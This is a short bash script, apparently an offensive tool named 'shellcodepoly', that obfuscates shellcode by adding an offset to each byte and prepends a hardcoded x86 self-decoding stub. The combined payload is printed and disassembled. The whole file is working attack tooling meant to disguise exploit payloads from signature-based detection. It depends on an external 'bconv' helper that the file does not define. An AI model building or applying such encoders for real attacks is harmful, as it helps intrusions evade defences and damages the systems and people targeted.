#!/bin/bash

# Name:   shellcodepoly (polymorphic shellcode generator)
# Usage:  shellcodepoly  [offset]

shellcode="$1"
offset="$2"

bytes=`echo $shellcode | tr -d \" | sed 's/\\\x/\n/g' | grep -v ^$`
max=`echo "$bytes" | sort -ru | head -n1`
length=0
decoder="\xeb\x10\x5e\x31\xc9\xb1\x00\x80\x6c\x0e\xff\x00\xfe\xc9\x75\xf7\xeb\x05\xe8\xeb\xff\xff\xff"

if [ "$offset" == "" ]; then offset=`bconv FF-$max x x`; fi

echo ""
echo "input      = \"$shellcode\""
echo "offset     = 0x$offset"

for byte in `echo "$bytes"`; do
        length=`bconv $length+1 x x`
        obfuscated=$(echo -n "$obfuscated\x`bconv $byte+$offset x x`")
done

echo "obfuscated = \"$obfuscated\""
echo "length     = 0x$length"

decoder=`echo $decoder | sed -e "s/00/$length/" -e "s/00/$offset/"`

echo "decoder    = \"$decoder\""
echo ""

output="$decoder$obfuscated"

echo "output  = \"$output\""
echo ""
echo -ne $output | ndisasm -u -
